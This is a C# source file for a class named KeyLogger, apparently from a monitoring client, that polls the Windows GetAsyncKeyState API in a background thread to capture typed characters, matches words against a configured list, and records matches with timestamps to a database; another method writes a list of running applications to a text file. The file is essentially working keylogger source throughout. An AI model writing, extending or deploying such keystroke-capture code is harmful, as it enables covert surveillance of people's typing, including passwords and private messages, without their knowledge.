using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace ClientSide
{
    class KeyLogger
    {
        public DBclient dbs;
        public setSetting set;

       public KeyLogger(DBclient dbs, setSetting set)
        {
            this.dbs = dbs;
            this.set = set;
            playThread();
        }

        // keylogger from API
        [DllImport("User32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        public  void playThread()
        {
            Thread keyLogger = new Thread(playKeyLogger);
            keyLogger.Start();
        }

        public  void playKeyLogger()

        {
            string[] a = set.getWord();
            String input = "";
            Boolean flag = true;
            while (flag)
            {
                Thread.Sleep(5);
                for (int i = 32; i < 127; i++)
                {

                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 32769)
                    {

                        input += (char)i; 

                        if (i == 32)
                        {
                            //ShowErrorDialog(input);
                            string replacement = input.Replace(" ", "");
                            //ShowErrorDialog(replacement);
                             foreach (string x in a)
                             {

                                 string xb = x.Replace(" ", "");

                                 if (replacement.ToLower().Equals(x))
                                 {
                                     //ShowErrorDialog("bad ward insert");
                                     dbs.connectToDatabase();
                                     dbs.fillTable(1, DateTime.Now.ToString(), x + " " + "in process chrome");
                                     //string AllApp = ShowAllProcess.ListAllWebSite();
                                     //ShowErrorDialog("ListAllWebSite: \n" + AllApp);

                                }
                            }
                            input = "";
                        }

                        // SARA 
                    }
                }
            }  

        }


        public  void inputEqualsSARA()
        {
           
            
            // sava keylogger in file
            String filepath = Environment.CurrentDirectory;
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
           
            string path = (filepath + @"\AllAPP.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path)) ;
            }
            string AllApp = ShowAllProcess.ListAllApplications();
            using (StreamWriter sw = File.AppendText(path))
            {
                sw.Write(AllApp);

            }
            ShowErrorDialog(AllApp);//SARA 





        }

        private static void ShowErrorDialog(string message)
        {
            MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
        }
    }
}
//SARA SARA 
